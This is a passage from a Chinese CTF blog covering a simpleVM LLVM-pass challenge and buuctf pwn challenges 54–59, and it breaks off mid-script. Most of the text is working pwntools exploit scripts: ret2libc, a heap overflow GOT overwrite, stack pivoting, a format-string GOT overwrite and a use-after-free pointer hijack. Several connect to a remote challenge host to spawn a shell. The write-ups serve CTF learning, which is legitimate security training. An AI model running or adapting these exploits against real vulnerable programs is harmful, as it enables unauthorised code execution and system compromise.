src="https://img-blog.csdnimg.cn/6d512bb802574c468b67907810b79d2b.png"><br>下面一个条件判断判断函数名是否是push，想都不用想这一定是入栈操作，将两个寄存器中的一个的值压入栈中，然后栈指针上移。</p><h3 id="Segment-4"><a href="#Segment-4" class="headerlink" title="Segment 4"></a>Segment 4</h3><p><img src="https://img-blog.csdnimg.cn/1017879b626a4fa79bbea190de2ff754.png"><br>当函数名为store时，注意最后的4行代码，出现了指针操作。其将一个寄存器看成指针，将这个地址保存的值拷贝到另外一个地址，这个地址就是另外一个寄存器指定的地址的地址（二重指针）。很明显这里我们可以将任意地址保存到这两个寄存器中。</p><h3 id="Segment-5"><a href="#Segment-5" class="headerlink" title="Segment 5"></a>Segment 5</h3><p><img src="https://img-blog.csdnimg.cn/7387e6cd81ec4d6db90b75e6bd1bacbe.png"><br>当函数名为load时，操作与store类似，但要注意拷贝的方向。store和load函数一定会是我们pwn的重点，至于具体应该如何去pwn，待下面进行调试时再去探索。</p><h3 id="Segment-6"><a href="#Segment-6" class="headerlink" title="Segment 6"></a>Segment 6</h3><p><img src="https://img-blog.csdnimg.cn/223fe7f552d84d47860e1ce3fd19607e.png"><br>add函数加法操作，有两个参数。第一个参数指定寄存器，第二个参数是要加到这个寄存器上的数值。这个函数对于我们的pwn也是有很大意义的。可以构造任意地址。</p><h3 id="Segment-7"><a href="#Segment-7" class="headerlink" title="Segment 7"></a>Segment 7</h3><p><img src="https://img-blog.csdnimg.cn/0d7b3a5139fa4c26a9c7da92cca1e185.png"><br>min函数减法操作，有2个参数，第一个参数指定寄存器，第二个参数是要减去的数值。</p><p>至此，源码已经全部分析完毕。我们已经可以在exp中编写6个函数的原型了，注意参数的类型和个数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Step-5-编写exp-c，同时进行调试"><a href="#Step-5-编写exp-c，同时进行调试" class="headerlink" title="Step 5: 编写exp.c，同时进行调试"></a>Step 5: 编写exp.c，同时进行调试</h2><p>现在，我们来着手编写exp，重点需要调试load和store这两个函数的执行。</p><p>一开始，reg1、reg2、stack中所有的值都为0，由于本题中opt-8程序没有开启PIE保护，因此其加载基址固定不变，我们可以利用这个获取到其got表中的地址，将其拷贝到reg或stack中。然后在此基础上计算出one_gadget的地址，将其写回到got表，即可执行one_gadget，逻辑很简单。</p><p>在这里，我们选择free函数作为地址覆盖的对象，找到opt程序中free函数got表的位置为0x77E100。因此o0o0o0o0函数的第一条语句应该是：<code>add(1, 0x77E100);</code>。然后使用load函数将got表中地址值保存到另一个寄存器中：<code>load(1);</code>。现在我们想要的地址在reg2中，加上相应的one_gadget偏移。与上一题相同，这里使用的是笔者虚拟机的libc而不是题目给的libc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p>找到free函数偏移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# python3</span><br><span class="line">Python 3.8.10 (default, Jun 22 2022, 20:18:18) </span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">[*] &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&gt;&gt;&gt; print(hex(libc.symbols[&#x27;free&#x27;]))</span><br><span class="line">0x9a6d0</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure><p>因此，第三条语句应该是<code>add(2, 0x4942e);</code>，这样就得到了第一个one_gadget的地址。第四条语句将其写回到free.got中：<code>store(1);</code>，完成，我们连stack都没有用到。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">load(<span class="number">1</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4942e</span>);</span><br><span class="line">store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试运行，发现3个one_gadget都不行，应该是one_gadget的条件不满足。因此考虑写入system函数的地址，然后创建一个名为sh的函数，看看能不能执行到system(“sh”)。system函数的libc偏移为0x52290。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">load(<span class="number">1</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x52290</span>);</span><br><span class="line">store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span>&#123;&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4ae5415fedc64a66b9aa38fce02d8396.png"><br>可惜，还是不行。使用原来的libc应该是可以跑one_gadget的，因为有两个one_gadget的条件是栈中某处为0，相对来说更容易满足一些。笔者尝试通过追踪函数调用链获取到VMPass.so的加载基址，但发现VMPass.so的runOnFunction函数是通过call寄存器的方式调用的，目前尚无思路。不过这道题本身还是不难理解的，能够做到修改one_gadget就已经足够了。</p><p>下一篇文章笔者将会分析今年（2022）国赛题的satool，看一下和去年的同名题有什么区别。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (7)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-7/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-7/</url>
      
        <content type="html"><![CDATA[<h1 id="buu054-jarvisoj-level1"><a href="#buu054-jarvisoj-level1" class="headerlink" title="buu054-jarvisoj_level1"></a>buu054-jarvisoj_level1</h1><p>又是那个jarvisoj特有的“肠梗阻”问题，远程的消息不发点东西过去它是不会过来的，这题本来是在栈中写shellcode然后返回到栈上执行，但是也可以用ret2Libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26705</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu055-babyfengshui-33c3-2016"><a href="#buu055-babyfengshui-33c3-2016" class="headerlink" title="buu055-babyfengshui_33c3_2016"></a>buu055-babyfengshui_33c3_2016</h1><p>一道考察堆排布的题目，一共可以添加最多50个用户，每一个用户的信息用两个chunk来保存。第一个chunk保存description，大小可以自由选择，第二个chunk保存第一个chunk的地址加用户名，大小固定为0x80（可写大小）。<br><img src="https://img-blog.csdnimg.cn/73152ca45e1c452699153c9429e6e11e.png"><br>需要重点关注一下选项0添加用户中用于读取姓名的函数中的一个检查。<br><img src="https://img-blog.csdnimg.cn/8cb5a169ff624ca4bac1c9a9da2d2dd0.png"><br>这个地方检查的是两个堆地址的大小关系。那这个检查到底检查的是什么呢？<br>ptr存放50个user_info指针，那么&amp;ptr+index应该就是要写入用户名的user_info的地址，查阅汇编代码发现后面的name[120]不明所以，故调试才是最好的理解方式。调试发现，这里实际上检查的是：一个user_info中desc的输入长度是否超限。它的比较方式是：首先输入desc的长度（这里实际上是重复输入，前面已经输入过一次长度，desc的chunk已经分配），然后程序比较”desc+长度”这个地址是否超过了user_info的地址。由于desc先于user_info分配，因此这样检查。如分配的desc可写头部地址为0x8049208，可写大小为0x80，user_info的可写头部地址为0x8049298，在写入desc的时候输入大小为0x40，那么这个检查比较的是0x8049208+0x40和0x804929c（user_info的size）的大小。<br>如此看来，绕过这个检查的思路就很清晰了。我们想办法让这两个chunk分配的距离远一点，中间还有其他的chunk，而且desc分配在user_info的低地址位置。这样的话我们就可以通过写入desc来覆盖某些chunk。<br>如下图就是一个简洁的利用思路。<br><img src="https://img-blog.csdnimg.cn/88d36196d4874024b720cf2a7c004adf.png"><br>通过堆溢出将user_info #3中的desc指针替换成.got表地址，获取到free函数地址后计算system地址，再写回到got表中，调用free函数即可执行system(‘&#x2F;bin&#x2F;sh’)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29858</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, desclen, desc, name</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size of description: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(desclen).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index, desclen, desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(desclen).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;text: &#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># user #0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># user #1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># user #2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># prev size of user_#2.desc</span></span><br><span class="line">payload += p32(<span class="number">0x29</span>)<span class="comment"># size of user_#2.desc</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># prev size of user_#2.userinfo</span></span><br><span class="line">payload += p32(<span class="number">0x89</span>)<span class="comment"># size of user_#2.userinfo</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment"># change the desc pointer to .plt.got</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x100</span>, payload, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># user #3, desc chunk = userinfo #1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">free = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free)</span><br><span class="line">base = free - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">4</span>, p32(sys))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu056-ciscn-2019-s-4"><a href="#buu056-ciscn-2019-s-4" class="headerlink" title="buu056-ciscn_2019_s_4"></a>buu056-ciscn_2019_s_4</h1><p>这题的vuln函数里面有两个输入，第一个输入我们通过printf套出来ebp的地址，可以计算得到我们输入的字符串的地址，之后第二个输入将ebp修改到字符串里面，返回到一个函数内部，在没有push ebp的前提下，leave指令会首先进行mov esp, ebp操作，将esp强制上抬到我们的字符串中间，将system地址写到字符串中即可getshell。注意字符串’&#x2F;bin&#x2F;sh’要写到system地址高地址处，防止system函数内部覆盖字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28199</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">40</span>-<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">io.recv(<span class="number">40</span>)</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])        <span class="comment"># offset: 0x0</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])     <span class="comment"># offset: 0x4</span></span><br><span class="line">payload += p32(buf_addr + <span class="number">0xC</span>)          <span class="comment"># offset: 0x8</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>               <span class="comment"># offset: 0xC</span></span><br><span class="line">payload += cyclic(<span class="number">0x14</span>)                 <span class="comment"># 0ffset: 0x14</span></span><br><span class="line">payload += p32(buf_addr - <span class="number">4</span>)            <span class="comment"># ebp</span></span><br><span class="line">payload += p32(<span class="number">0x8048562</span>)               <span class="comment"># ret addr: leave; ret</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu057-hitcontraining-magicheap"><a href="#buu057-hitcontraining-magicheap" class="headerlink" title="buu057-hitcontraining_magicheap"></a>buu057-hitcontraining_magicheap</h1><p>和第39题完全相同，除了magic和heaparray的地址少了0x20。略过。</p><h1 id="buu058-axb-2019-fmt32"><a href="#buu058-axb-2019-fmt32" class="headerlink" title="buu058-axb_2019_fmt32"></a>buu058-axb_2019_fmt32</h1><p>格式化字符串题。首先通过调试找到格式化字符串的偏移：<br><img src="https://img-blog.csdnimg.cn/47a6b3421a8c444dbc6728cc82ca0b28.png"><br>使用格式化字符串泄露got表地址，然后使用fmtstr_payload函数构造payload，将printf函数的got表地址改成system。（下面的代码有一定概率通不过，不知道是什么原因）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29861</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, <span class="string">b&#x27;a%9$s&#x27;</span> + p32(elf.got[<span class="string">&#x27;alarm&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Repeater:a&#x27;</span>)</span><br><span class="line">alarm = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(alarm))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>, alarm)</span><br><span class="line">base = alarm - libc.dump(<span class="string">&#x27;alarm&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line">payload = <span class="string">b&#x27;|| deadbeef||&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">11</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: sys&#125;, numbwritten=<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;|| /bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu059-ciscn-2019-n-3"><a href="#buu059-ciscn-2019-n-3" class="headerlink" title="buu059-ciscn_2019_n_3"></a>buu059-ciscn_2019_n_3</h1><p>经过对源程序的分析，可以得到本题中使用的数据结构如下：<br><img src="https://img-blog.csdnimg.cn/cf4990b277154a348f0414e5230cd8a3.png"><br>records全局变量是chunk_info*的数组。其中可以存放整型或字符串。<br>在两个释放内存的函数中都没有将全局变量中的对应指针删除，可能会导致UAF。<br>由于打印内容使用的是chunk_info中的函数指针，因此修改这个函数指针可以有任意代码执行。<br>此处利用UAF修改函数指针，修改free函数指针到system，修改print函数指针为字符串’sh\x00\x00’，这样在删除的时候就可以执行”system(‘sh’)”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, <span class="built_in">type</span>, content, length=<span class="number">0</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Type &gt; &#x27;</span>, <span 